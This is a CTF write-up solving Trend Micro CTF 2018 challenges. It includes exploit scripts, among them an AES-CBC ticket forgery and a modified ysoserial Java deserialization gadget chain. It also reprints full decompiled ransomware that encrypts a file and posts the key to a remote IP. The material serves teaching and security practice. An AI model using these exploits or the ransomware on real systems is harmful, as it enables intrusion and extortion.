# Trend Micro CTF 2018

[Web version](https://balsn.github.io/ctf_writeup/20180914-trendmicroctf/)

 - [Trend Micro CTF 2018](#trend-micro-ctf-2018)
   - [Analysis-Offensive](#analysis-offensive)
     - [200](#200)
     - [300](#300)
     - [400 ACME Protocol](#400-acme-protocol)
   - [Reversing-Binary](#reversing-binary)
     - [100 (sces60107)](#100-sces60107)
     - [300](#300-1)
     - [400](#400)
       - [part 2](#part-2)
   - [Forensics-Crypto1](#forensics-crypto1)
     - [400](#400-1)
   - [Forensics-Crypto2](#forensics-crypto2)
     - [100 (sces60107)](#100-sces60107-1)
     - [200 (sces60107)](#200-sces60107)
     - [300](#300-2)
   - [Reversing-Other](#reversing-other)
     - [100, 200 (sces60107)](#100-200-sces60107)
     - [400 (sces60107)](#400-sces60107)
   - [Misc](#misc)
     - [100](#100)
     - [200](#200-1)
     - [300](#300-3)



## Analysis-Offensive

### 200

We are given a program `oracle` which reads our input. If our input matches the flag, it outputs `True`, otherwise, `False`.

According to the hints from the description, (1) The program exits as fast as possible. (2) This is not a reverse challenge.

So, let's take a look at the system calls it uses:
```shell
$ strace ./oracle TMCTF{
execve("./oracle", ["./oracle", "TMCTF{"], [/* 23 vars */]) = 0
brk(NULL)                               = 0x146d000
brk(0x146e1c0)                          = 0x146e1c0
arch_prctl(ARCH_SET_FS, 0x146d880)      = 0
uname({sysname="Linux", nodename="ubuntu-xenial", ...}) = 0
readlink("/proc/self/exe", "/home/vagrant/trend/analysis-200"..., 4096) = 39
brk(0x148f1c0)                          = 0x148f1c0
brk(0x1490000)                          = 0x1490000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
nanosleep({0, 15000000}, NULL)          = 0
nanosleep({0, 15000000}, NULL)          = 0
nanosleep({0, 15000000}, NULL)          = 0
nanosleep({0, 15000000}, NULL)          = 0
nanosleep({0, 15000000}, NULL)          = 0
nanosleep({0, 15000000}, NULL)          = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
write(1, "False\n", 6False
)                  = 6
exit_group(0)                           = ?
+++ exited with 0 +++
```
Nice, it sleeps six times when the first six characters are correct. Here is our script:

```python
import subprocess
import string

flag = 'TMCTF{'
while True:
    for c in string.ascii_letters + string.digits + '{}_':
        batcmd = '/usr/bin/strace ./oracle "{}" 2>&1'.format(flag + c)
        result = subprocess.check_output(batcmd, shell=True)
        if result.count('nano') == len(flag) + 1:
            flag += c
            break
    print(flag)
```
FLAG: `TMCTF{WatchTh3T1m3}`

### 300
We are given three people's public keys and the messages for them respectively. For example,
```
message for Alice:
18700320110367574655449823553009212724937318442101140581378358928204994827498139841897479168675123789374462637095265564472109735802305521045676412446455683615469865332270051569768255072111079626023422

Alice's public key (e,N):
( 65537 , 23795719145225386804055015945976331504878851440464956768596487167710701468817080174616923533397144140667518414516928416724767417895751634838329442802874972281385084714429143592029962130216053890866347 )
```
It turns out that any two of the module `N`s has a common factor, thus they all can be factorized.
```python
from gmpy2 import *

...

g_ab = gcd(a_N, b_N)
g_bc = gcd(b_N, c_N)

def decrypt(msg, p, q, N):
    phi_n = (p-1)*(q-1)
    d = invert(65537, phi_n)
    msg = pow(msg, d, N)
    print(int2text(msg))

decrypt(a_msg, g_ab, a_N/g_ab, a_N)
decrypt(b_msg, g_ab, b_N/g_ab, b_N)
decrypt(c_msg, g_bc, c_N/g_bc, c_N)
```
Hmm... is it worth 300 points?
FLAG: `TMCTF{B3Car3fu11Ab0utTh3K3ys}`


### 400 ACME Protocol

We are given a protocol and some reference implementation in Python. The author of this challenge is so kind. Even a protocol spec is given! so let's take a closer look at the protocol to find the vulnerability.

First, our objective is obvious: run `getflag` as `admin`

```
4.6 COMMAND (Message Type 0x06)

Message Format: Client -> Server: 0x06 | Ticket | Command

Explanation: Client requests execution of the command specified by the string Command. Ticket must be a valid, current ticket received via a LOGON_SUCCESS message.

Processing: The server executes the following algorithm upon receipt:

Set D = Decrypt(Base64Decode(Ticket), KS)
Scan D sequentially as follows:
Set IdentityFromTicket = JSON string (UTF-8, null-terminated)
Set Timestamp = 8 bytes
If Timestamp is too old (> 1 hour):
	Respond with message AUTHX_FAILURE
	End
Set U to the string IdentityFromTicket.user
Iterate over IdentityFromTicket.groups, collecting the results into an array of strings, G
Set Identity = object expressing U and G
If Command = “whoami”:
	Set Result = JSON string: { user: Identity.U, groups: [ G1, G2, ... ] }
		where G1, G2, ... are the elements of Identity.G
Else If Command = “getflag”:
	If G contains the string “admin”:
		Set Result = CTF flag
	Else:
		Respond with message AUTHX_FAILURE
		End
Else:
	Respond with message AUTHX_FAILURE
	End
Respond with message COMMAND_RESULT(Result)
```

Okay, the next problem is how to generate a valid `IdentityFromTicket`, which is a JSON string encrypted by KS (server key)? What we want to do is to send `Encrypt({"user":"admin","groups":["admin"]} | timestamp)`. Note that in this challenge we don't even have a valid guest account to login. 

Of course we don't have the server key, but can we abuse other command to manipulate the payload? Let's take a look at LOGON_REQUEST:

```
4.1 LOGON_REQUEST (Message Type 0x01)

Message format: Client -> Server: 0x01 | U

Explanation: The client sends this message to the server to initiate authentication with username U.

Processing: The server executes the following algorithm upon receipt:

Set Nonce = 8-byte random nonce
Set Timestamp = current timestamp
Set ChallengeCookie = Base64Encode(Encrypt(Nonce | U | Timestamp, KS))
Respond with message LOGON_CHALLENGE(Nonce, ChallengeCookie)
```

Basically the server will encrypt user-provided U (username), and we'll get the ciphertext of `Encrypt(Nonce | U | Timestamp)`.

It's apparent that `Encrypt(Nonce | U | Timestamp)` is similar to what we need, `Encrypt({"user":"admin","groups":["admin"]} | timestamp)`.  However, how to get rid of the nonce?

Since the encryption uses AES-128-CBC, it's feasible to truncate the nonce! 

The idea is simple: we'll let the server encrypt the following payload:

```
block 0: 8-byte nonce + 8-byte garbage
block 1,2,3: 16 * 3 bytes JSON string
block 4: 8-byte timestamp + 8-byte PKCS#7 padding
```

and we'll truncate the first block.

Here is the attack script:

```python
#!/usr/bin/env python3
import socket
import time
import numpy as np
import json
import base64

def send(s):
    sock.send(s)
    print(f'[<-send] {s}')

def recv():
    s = sock.recv(2**14)
    print(f'[recv->] {repr(s)}')
    return s

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 9999))

payload = '{"user":"admin","groups":["admin", "aaaaaaaaa"]}'
assert len(payload) == 16 * 3
send(b'\x01garbage!' + payload.encode() + b'\x00')
# 0x02 | 8 byte Nonce | ChallengeCookie (null byte terminated)
enc = base64.b64decode(recv()[1+8:-1])
# enc: 6 blocks: iv | (8 byte Nonce | 8 byte garbage!) | 48 bytes payload | Timestamp
assert len(enc) == 16 * 6

#0x06 | Ticket | Command
send(b'\x06' + base64.b64encode(enc[16:]) + b'\x00' + b'getflag\x00')
print(recv())
# TMCTF{90F41EF71ED5}
sock.close()
```

I guess some teams retrieve the flag using reverse skills, though the author claimed it's heavily obfuscated.

In real world, there are lots of protocols and it's really important to ensure every step is secure. IMO this challenge is well-designed and very interesting! I really enjoyed it. Thanks to the author for such a practical challenge. 


## Reversing-Binary

### 100 (sces60107)

1. Use PyInstaller Extractor v1.9 and uncompyle2
2. Now we have this source code
```python=
import struct, os, time, threading, urllib, requests, ctypes, base64
from Cryptodome.Random import random
from Cryptodome.Cipher import AES, ARC4
from Cryptodome.Hash import SHA
infile = 'EncryptMe1234.txt'
encfile = 'EncryptMe1234.txt.CRYPTED'
keyfile = 'keyfile'
sz = 1024
bs = 16
passw = 'secretpassword'
URL = 'http://192.168.107.14'
rkey = 'secretkey'
key = os.urandom(bs)
iv = os.urandom(bs)

def callbk():
    global rkey
    global passw
    global iv
    global key
    id = 0
    n = 0
    while id == 0 or n == 0 and n < 256:
        id = os.urandom(1)
        n = hex(ord(id) + bs)

    id = id.encode('hex')
    for c in passw:
        passw = ''.join(chr(ord(c) ^ int(n, 16)))

    key = ''.join((chr(ord(x) ^ int(n, 16)) for x in key))
    for c in rkey:
        rkey = ''.join(chr(ord(c) ^ int(n, 16)))

    iv = ''.join((chr(ord(y) ^ int(n, 16)) for y in iv))
    key = key.encode('hex')
    iv = iv.encode('hex')
    Headers = {'Content-Type': 'application/x-www-form-urlencoded',
     'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36'}
    params = urllib.urlencode({'id': id,
     'key': key,
     'iv': iv})
    rnum = os.urandom(bs)
    khash = SHA.new(rnum).digest()
    cipher1 = ARC4.new(khash)
    khash = khash.encode('hex')
    msg = cipher1.encrypt(params)
    msg = base64.b64encode(khash + msg.encode('hex'))
    response = requests.post(url=URL, data=msg, headers=Headers)
    del key
    del iv
    ctypes.windll.user32.MessageBoxA(0, 'Your file "EncryptMe1234.txt" has been encrypted. Obtain your "keyfile" to decrypt your file.', 'File(s) Encrypted!!!', 1)


def encrypt():
    global encfile
    global infile
    aes = AES.new(key, AES.MODE_CBC, iv)
    if os.path.exists(infile):
        fin = open(infile, 'r')
        fout = open(encfile, 'w')
        fsz = os.path.getsize(infile)
        fout.write(struct.pack('<H', fsz))
        while True:
            data = fin.read(sz)
            n = len(data)
            if n == 0:
                break
            elif n % bs != 0:
                data += '0' * (bs - n % bs)
            crypt = aes.encrypt(data)
            fout.write(crypt)

        fin.close()
        fout.close()
        os.remove(infile)
        callbk()
    else:
        return


def decrypt():
    global keyfile
    key = ''
    iv = ''
    if not os.path.exists(encfile):
        exit(0)
    while True:
        time.sleep(10)
        if os.path.exists(keyfile):
            keyin = open(keyfile, 'rb')
            key = keyin.read(bs)
            iv = keyin.read(bs)
            if len(key) != 0 and len(iv) != 0:
                aes = AES.new(key, AES.MODE_CBC, iv)
                fin = open(encfile, 'r')
                fsz = struct.unpack('<H', fin.read(struct.calcsize('<H')))[0]
                fout = open(infile, 'w')
                fin.seek(2, 0)
                while True:
                    data = fin.read(sz)
                    n = len(data)
                    if n == 0:
                        break
                    decrypted = aes.decrypt(data)
                    n = len(decrypted)
                    if fsz > n:
                        fout.write(decrypted)
                    else:
                        fout.write(decrypted[:fsz])
                    fsz -= n

                fin.close()
                os.remove(encfile)
                break


def main():
    encrypt()
    t2 = threading.Thread(target=decrypt, args=())
    t2.start()
    t2.join()


if __name__ == '__main__':
    main()
```
3. Extract information from filecrypt.pcap and decrypt the message then get this string `id=d1&key=2f87011fadc6c2f7376117867621b606&iv=95bc0ed56ab0e730b64cce91c9fe9390`
4. But these are not the original key and the original iv. Take a look of this part of code, then you can recover the original key and the original iv
```python
 while id == 0 or n == 0 and n < 256:
        id = os.urandom(1)
        n = hex(ord(id) + bs)

    id = id.encode('hex')
    for c in passw:
        passw = ''.join(chr(ord(c) ^ int(n, 16)))

    key = ''.join((chr(ord(x) ^ int(n, 16)) for x in key))
    for c in rkey:
        rkey = ''.join(chr(ord(c) ^ int(n, 16)))

    iv = ''.join((chr(ord(y) ^ int(n, 16)) for y in iv))
    key = key.encode('hex')
    iv = iv.encode('hex')
```
5. The original key = `"ce66e0fe4c272316d680f66797c057e7".decode("hex")`
6. The original iv = `"745def348b5106d157ad2f70281f7271".decode("hex")`
7. Now you know how to retrieve the flag `TMCTF{MJB1200}`

### 300 
The PE file has been `MEW` packed, we can using ollydbg to unpack it. And it also has anti debugger detection, but we can easily using static analysis to find the flag.

### 400
#### part 2
Using state compression to boost the speed of searching.
```C++
#pragma GCC optimize ("O3")
#include<bits/stdc++.h>
#pragma GCC optimize ("O3")
#define f first
#define s second
using namespace std;
typedef pair<int,int> par;
unsigned char op[62];
int cnt=0;
inline unsigned char tohex(int x){
    if(x>9)return x-10+'a';
    return x+'0';
}
char s[100];
unsigned int chash(){
    unsigned long long int a = 0;
    for(int i=0;i<62;i++){
        a = ( tohex((op[i]>>4&0xF)) + (a >> 13 | a << 19)) & 0xffffffffll;
        a = ( tohex(op[i]&0xF) + (a >> 13 | a << 19)) & 0xffffffffll;
    }
    return a;
}
void F(int p,int mask,bool boat){
    if(p==62&&mask==0xFF){
        cnt++;
        unsigned int hsh=chash();
        if(
            hsh==0xE67FE7B8||
            hsh==0xE27FEBB8||
            hsh==0xE66FE7C8||
            hsh==0xE26FEBC8||
            hsh==0xF276F3DC||
            hsh==0xE27703DC||
            hsh==0xF272F3E0||
            hsh==0xE27303E0
        ){
            fprintf(stderr,"%d %08x ",cnt,hsh);
            for(int i=0;i<62;i++)
                fprintf(stderr,"%02x",op[i]);
            fprintf(stderr,"\n");
        }
        //puts("~~~");
        return;
    }
    if(p+4<=62){
        op[p]=0xd1;
        if(boat==0){
            op[p+1]=0x1;
            for(int x=~mask&0xFF,y=x&-x;y;x^=y,y=x&-x){
                op[p+3]=y;
                for(int x2=(x^y)&0xE0,y2=x2&-x2;y2;x2^=y2,y2=x2&-x2){
                    op[p+2]=y2;
                    if(y2==0x40&&y==0x10)
                        continue;
                    int nmk=mask^y^y2;
                    if((y==0x20||y2==0x20)&&((~nmk&0x42)==0x42||(~nmk&0x41)==0x41))
                        continue;
                    if((y==0x40||y2==0x40)&&((~nmk&0x28)==0x28||(~nmk&0x24)==0x24))
                        continue;
                    if((y==0x80||y2==0x80)&&((~nmk&0x10)==0x10&&(~nmk&0xFF)!=0x10))
                        continue;
                    F(p+4,nmk,boat^1);
                }
            }
        }
        else{
            op[p+1]=0x0;
            for(int x=mask,y=x&-x;y;x^=y,y=x&-x){
                op[p+3]=y;
                for(int x2=(x^y)&0xE0,y2=x2&-x2;y2;x2^=y2,y2=x2&-x2){
                    op[p+2]=y2;
                    if(y2==0x40&&y==0x10)
                        continue;
                    int nmk=mask^y^y2;
                    if((y==0x20||y2==0x20)&&((nmk&0x42)==0x42||(nmk&0x41)==0x41))
                        continue;
                    if((y==0x40||y2==0x40)&&((nmk&0x28)==0x28||(nmk&0x24)==0x24))
                        continue;
                    if((y==0x80||y2==0x80)&&((nmk&0x10)==0x10&&(nmk&0xFF)!=0x10))
                        continue;
                    F(p+4,nmk,boat^1);
                }
            }
        }
    }
    if(p+3<=62){
        op[p]=0xd0;
        if(boat==0){
            op[p+1]=0x1;
            for(int x=~mask&0xE0,y=x&-x;y;x^=y,y=x&-x){
                op[p+2]=y;
                int nmk=mask^y;
                if((y==0x20)&&((~nmk&0x42)==0x42||(~nmk&0x41)==0x41))
                    continue;
                if((y==0x40)&&((~nmk&0x28)==0x28||(~nmk&0x24)==0x24))
                    continue;
                if((y==0x80)&&((~nmk&0x10)==0x10&&(~nmk&0xFF)!=0x10))
                    continue;
                F(p+3,nmk,boat^1);
            }
        }
        else{
            op[p+1]=0x0;
            for(int x=mask&0xE0,y=x&-x;y;x^=y,y=x&-x){
                op[p+2]=y;
                int nmk=mask^y;
                if((y==0x20)&&((nmk&0x42)==0x42||(nmk&0x41)==0x41))
                    continue;
                if((y==0x40)&&((nmk&0x28)==0x28||(nmk&0x24)==0x24))
                    continue;
                if((y==0x80)&&((nmk&0x10)==0x10&&(nmk&0xFF)!=0x10))
                    continue;
                F(p+3,mask^y,boat^1);
            }
        }
    }
    return;
}
int main(){
    F(0,0,0);
}
```
And you would get the output in about 15 seconds on Intel 8650U.
```
45721 e27303e0 d1018010d00080d1018001d1008010d1012002d00020d1014020d00040d1018010d00020d1014020d00040d1014004d1008010d1018008d00080d1018010
45724 f272f3e0 d1018010d00080d1018001d1008010d1012002d00020d1014020d00040d1018010d00020d1014020d00040d1014008d1008010d1018004d00080d1018010
59555 e27703dc d1018010d00080d1018002d1008010d1012001d00020d1014020d00040d1018010d00020d1014020d00040d1014004d1008010d1018008d00080d1018010
59558 f276f3dc d1018010d00080d1018002d1008010d1012001d00020d1014020d00040d1018010d00020d1014020d00040d1014008d1008010d1018004d00080d1018010
72019 e26febc8 d1018010d00080d1018004d1008010d1014008d00040d1014020d00020d1018010d00040d1014020d00020d1012001d1008010d1018002d00080d1018010
72022 e66fe7c8 d1018010d00080d1018004d1008010d1014008d00040d1014020d00020d1018010d00040d1014020d00020d1012002d1008010d1018001d00080d1018010
85399 e27febb8 d1018010d00080d1018008d1008010d1014004d00040d1014020d00020d1018010d00040d1014020d00020d1012001d1008010d1018002d00080d1018010
85402 e67fe7b8 d1018010d00080d1018008d1008010d1014004d00040d1014020d00020d1018010d00040d1014020d00020d1012002d1008010d1018001d00080d1018010
```
Send the instructions into the problem program.
And you would get the flag:`TMCTF{v1rtu4l_r1v3r5_n_fl4g5}`
By the way, there are 1348396 solutions of this problem.
## Forensics-Crypto1

### 400
We are given a pair of plaintext and ciphertext, also, an encrypted secret text. In this challenge, Feistel cipher is used in encryption. The round function is choosen to be `xor`, while the number of rounds of encryption is unknown. Our goal is to decrypt the secret text.

Let's first write down the results after every round of encryption. Let `L`, `R` be the first and last half of the plaintext, we simply ignore the difference of the keys and denote the xor sum of them as `K`. (But remember that they are not actually the same.) Note that the operation `+` means `xor`.
```
Round 0: L, R
Round 1: R, L+R+K
Round 2: L+R+K, L+K
Round 3: L+K, R+K
Round 4: R+K, L+R+K
... repeat
```
We could find a regular pattern of the results, it repeats every three rounds. Though we do not know the actual number of rounds of encryption, but there are only three possiblities to try. Here is our script for decryption:


```python
def bin2text(s):
    l = [s[i:i+8] for i in range(0, len(s), 8)]
    return ''.join([chr(int(c, 2)) for c in l])

def binxor(s, t):
    return ''.join([str(int(s[i]) ^ int(t[i])) for i in range(len(s))])
    
...

pt0, pt1 = pt[:144], pt[144:]
ct0, ct1 = ct[:144], ct[144:]
st0, st1 = st[:144], st[144:]

# guess the result is R+K, L+R+K
k1 = binxor(pt0, ct1)
k2 = binxor(binxor(ct0, ct1), pt1)

m1 = binxor(st1, k1)
m2 = binxor(binxor(st0, st1), k2)
print(bin2text(m1+m2))
```
FLAG: `TMCTF{Feistel-Cipher-Flag-TMCTF2018}`

## Forensics-Crypto2

### 100 (sces60107)

I will finish these part of writeup in my free time QQ

### 200 (sces60107)

1. Use PyInstaller Extractor v1.9
2. Cannot use uncompyle2. But we can reconstruct the flag directly from the byte code
3. xxd mausoleum and get this
![](https://i.imgur.com/Us1VVbq.png)
4. It's easy to find out the pieces of flag. And you can reconstruct the flag `TMCTF{the_s3cr3t_i$_unE@rth3d}`

### 300 

We can dump a x86 boot sector from `email.pdf`, that is a filesystem. when we mount the filesystem, we can see a small packet replay tool provided by trendmicro. We can find a packet replay binary at bin folder in the project. 

It has one more parameter `-g` than the original binary. At function `sub_C42690("34534534534534534534534erertert676575675675675", 10)` return value is `0xfbfa`, when we change hex to decimal, we got the flag `64506`

## Reversing-Other

### 100, 200 (sces60107)

I will finish these part of writeup in my free time QQ

### 400 (sces60107)

1. Use `dis.dis` then you can extract python code
2. Use Z3 to reconstruct the flag
```python=
from z3 import *

s=Solver()


flag=[]

for i in range(24):
  flag.append(BitVec("flag_"+str(i),32))
  s.add(flag[i] < 256)
  s.add(flag[i] > 0)


summ=0

for i in flag:
  summ+=i
s.add(summ%24 == 9)
s.add(summ/24 == 104)
inval=[]

for i in flag:
  inval.append(i^104)
ROFL=list(reversed(inval))
KYRYK = [0]*5
QQRTQ = [0]*5
KYRYJ = [0]*5
QQRTW = [0]*5
KYRYH = [0]*5
QQRTE = [0]*5
KYRYG = [0]*5
QQRTR = [0]*5
KYRYF = [0]*5
QQRTY = [0]*5
print len(inval)

for i in range(5):
  for j in range(4):
    KYRYK[i] ^= inval[i+j]
    QQRTQ[i] += inval[i+j]
    KYRYJ[i] ^= inval[i*j]
    QQRTW[i] += inval[i*j]
    KYRYH[i] ^= inval[i*j+8]
    QQRTE[i] += inval[i*j+8]
    KYRYG[i] ^= ROFL[i*j+8]
    QQRTR[i] += ROFL[i*j+8]
    KYRYF[i] ^= ROFL[i+j]
    QQRTY[i] += ROFL[i+j]
  KYRYK[i] += 32
  KYRYJ[i] += 32
  KYRYH[i] += 32
  KYRYG[i] += 32
  KYRYF[i] += 32
  QQRTE[i] += 8
  QQRTY[i] += 1

for i,j in zip(KYRYK,'R) +6'):
  k=ord(j)
  s.add(i == k)
for i,j in zip(QQRTQ,'l1:C('):
  k=ord(j)
  s.add(i == k)
for i,j in zip(KYRYJ,' RP%A'):
  k=ord(j)
  s.add(i == k)
for i,j in zip(QQRTW,[236,108,102,169,93]):
  s.add(i == j)
for i,j in zip(KYRYH,' L30Z'):
  k=ord(j)
  s.add(i == k)
for i,j in zip(QQRTE,' j36~'):
  k=ord(j)
  #print i,j
  s.add(i == k)
for i,j in zip(KYRYG,' M2S+'):
  k=ord(j)
  #print i,j
  s.add(i == k)
for i,j in zip(QQRTR,'4e\x9c{E'):
  k=ord(j)
  s.add(i == k)
for i,j in zip(KYRYF,'6!2$D'):
  k=ord(j)
  s.add(i == k)
for i,j in zip(QQRTY,']PaSs'):
  k=ord(j)
  s.add(i == k)
print s.check()
realflag = ""
for i in flag:
  realflag+=chr(s.model()[i].as_long())
print realflag
# TMCTF{SlytherinPastTheReverser}
```

## Misc

### 100
```shell
$ binwalk EATME.pdf

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.7"
353           0x161           JPEG image data, JFIF standard 1.01
383           0x17F           TIFF image data, big-endian, offset of first image directory: 8
749016        0xB6DD8         Zip archive data, at least v2.0 to extract, compressed size: 41, uncompressed size: 200, name: flag.txt
749123        0xB6E43         Zip archive data, at least v2.0 to extract, compressed size: 4168158, uncompressed size: -1, name: galf.txt
4969997       0x4BD60D        End of Zip archive, footer length: 31, comment: "Boooooom!"
4970099       0x4BD673        Zlib compressed data, default compression
4971214       0x4BDACE        Zlib compressed data, default compression
4971660       0x4BDC8C        Zlib compressed data, default compression
```
There are files `flag.txt` and `glaf.txt`. Try:
```shell
$ binwalk -Me EATME.pdf
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.7"
353           0x161           JPEG image data, JFIF standard 1.01
383           0x17F           TIFF image data, big-endian, offset of first image directory: 8
^C
```
Flag is in `flag.txt`. Be sure to press `^C`, otherwise, the file `galf.txt` with size `-1` will be extracted...
FLAG: `TMCTF{QWxpY2UgaW4gV29uZGVybGFuZA==}`

### 200

We are given a broken python script and a pcap file. The pcap file contains numerous ICMP ping packets, and it's obvious that there is payload hiding in ICMP tunnel. Let's extract them:

```shell
$ strings traffic.pcap -n16 | grep , | grep '^[0-9][0-9,\.]*'  -o
4.242410,2.970880
4.242410,2.970880
7.021890,1.989350
...
```

Moreover, the broken python script implements DBSCAN algorithm. It's not very difficult to recover the script with the [source](http://scikit-learn.org/stable/auto_examples/cluster/plot_dbscan.html) available. Also we adjust the DBSCAN parameters `eps` and `min_sample`. In fact several pairs of `eps` and `min_sample` can produce the desired result.

```python
import matplotlib.pyplot as plt
import seaborn as sns; sns.set()  # for plot styling
import numpy as np
from sklearn.datasets.samples_generator import make_blobs
from numpy import genfromtxt
from sklearn.cluster import DBSCAN

#humm, encontre este codigo en un servidor remoto
#estaba junto con el "traffic.pcap"
# que podria ser?, like some sample code 

X = np.genfromtxt('test_2.txt', delimiter=',')
print(X)
db = DBSCAN(eps=0.3, min_samples=10).fit(X)
labels = db.labels_
n_clusters_ = len(set(labels)) - (1 if -1 in labels else 0)
core_samples_mask = np.zeros_like(db.labels_, dtype=bool)
core_samples_mask[db.core_sample_indices_] = True
unique_labels = set(labels)
colors = [plt.cm.Spectral(each)
          for each in np.linspace(0, 1, len(unique_labels))]
for k, col in zip(unique_labels, colors):   
    class_member_mask = (labels == k)
    xy = X[class_member_mask & core_samples_mask]
    plt.plot(xy[:, 0], xy[:, 1], 'o', markerfacecolor=tuple(col),
             markeredgecolor='k', markersize=14)
			 

			 
#NOTE: what you see in the sky put it format TMCTF{replace_here}
#where "replace_here" is what you see
plt.title('aaaaaaaa: %d' % n_clusters_)
plt.show()
```

![](https://i.imgur.com/8kxeOoM.png)

With @sces60107's sharp eyes, we quicklly realize that this is the mirror or `FLAG:1`. And the rest of the work is to guess the flag. Try each combination of `One, 1, oNE, ONE, FLAG:1, flag:one, 1:flag, flag:1 ....`

The flag comes out to be `TMCTF{flag:1}`.

### 300

The challenge is about java unsafe deserialization. The file includes `commons-collections-3.1.jar` and a web server, which deserializes the user's input:

```java
// Server.java
@WebServlet({"/jail"})
public class Server
  extends HttpServlet
{
  private static final long serialVersionUID = 1L; 
  
  public Server() {}
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    try 
    { 
      ServletInputStream is = request.getInputStream();
      ObjectInputStream ois = new CustomOIS(is);
      Person person = (Person)ois.readObject();
      ois.close();
      response.getWriter().append("Sorry " + person.name + ". I cannot let you have the Flag!.");
    } catch (Exception e) {
      response.setStatus(500);
      e.printStackTrace(response.getWriter());
    } 
  }
}                
```

```java
// CustomOIS.java
public class CustomOIS
  extends ObjectInputStream
{
  private static final String[] whitelist = { "javax.management.BadAttributeValueExpException",
    "java.lang.Exception",
    "java.lang.Throwable",
    "[Ljava.lang.StackTraceElement;",
    "java.lang.StackTraceElement",
    "java.util.Collections$UnmodifiableList",
    "java.util.Collections$UnmodifiableCollection",
    "java.util.ArrayList",
    "org.apache.commons.collections.keyvalue.TiedMapEntry",
    "org.apache.commons.collections.map.LazyMap",
    "org.apache.commons.collections.functors.ChainedTransformer",
    "[Lorg.apache.commons.collections.Transformer;",
    "org.apache.commons.collections.functors.ConstantTransformer",
    "com.trendmicro.jail.Flag",
    "org.apache.commons.collections.functors.InvokerTransformer",
    "[Ljava.lang.Object;",
    "[Ljava.lang.Class;",
    "java.lang.String",
    "java.lang.Object",
    "java.lang.Integer",
    "java.lang.Number",
    "java.util.HashMap",
    "com.trendmicro.Person" };

  public CustomOIS(ServletInputStream is) throws IOException {
    super(is);
  }

  public Class<?> resolveClass(ObjectStreamClass des) throws IOException, ClassNotFoundException
  {
    if (!Arrays.asList(whitelist).contains(des.getName())) {
      throw new ClassNotFoundException("Cannot deserialize " + des.getName());
    }
    return super.resolveClass(des);
  }
}

```

```java
// Person.java and jail/Flag.java
public class Person implements Serializable {
  public String name;
  
  public Person(String name) {
    this.name = name;
  }
}
                                                                                                                                                                                                                     
public class Flag implements Serializable {
  static final long serialVersionUID = 6119813099625710381L;
  
  public Flag() {}
  
  public static void getFlag() throws Exception { throw new Exception("<FLAG GOES HERE>"); }
}

```

I use [jd-gui](http://jd.benow.ca/) to decompile the java class files.

The objective is to invoke `Flag.getFlag()`. However, it's tricky because:

1. getFlag() is static (class method)
2. Server.java only accesses the member `person.name`.
3. The server doesn't invoke any other method.

So we quickly realize it's not possible to call `getFlag()`. We need RCE / more powerful exploit.

We note that the `CustomOIS.java` uses a whitelist to check the resolved class name, but it's really suspicous because some weird classes are in the whiltelist, like `javax.management.BadAttributeValueExpException`.

With a quick Google we found [ysoserial](https://github.com/frohoff/ysoserial) can generate RCE payload for `commons-collections:3.1`, which is the dependency of the server. 

Actually the `CommonsCollections5` utilizes those classes in the whitelist to trigger RCE, but `Java.lang.Runtime` is not in the whilelist. I think it's not able to RCE.

Though we cannot call `Runtime.exec()`, at least we can try to invoke `Flag.getFlag()`.

Here is the modified version of [CommonCollection5.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java):

```java
// Some of the code is omitted.
...

import java.io.Serializable;
class Flag implements Serializable {
  static final long serialVersionUID = 6119813099625710381L;
  public Flag() {}
  public static void getFlag() throws Exception { throw new Exception("<FLAG GOES HERE>"); }                                             
}

public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

  public BadAttributeValueExpException getObject(final String command) throws Exception {
    final String[] execArgs = new String[] { command };
    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{ new ConstantTransformer(1) });
    // real chain for after setup
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Flag.class), // Flag class here 
        new InvokerTransformer("getMethod", new Class[] {
          String.class, Class[].class }, new Object[] {
          "getFlag", new Class[0] }), // invoke static method getFlag
        new InvokerTransformer("invoke", new Class[] {
          Object.class, Object[].class }, new Object[] {
          null, new Object[0] }),
        new ConstantTransformer(1) };

...

```

We have generate the payload, but the class name of Flag is incorrect; it should be `com.trendmicro.jail.Flag`. Let's use Python to do the replacement trick:

```python
# The first byte is the length of the class name
replace(b'\x17ysoserial.payloads.Flag',b'\x18com.trendmicro.jail.Flag')
```

The flag: `TMCTF{15nuck9astTheF1agMarsha12day}`

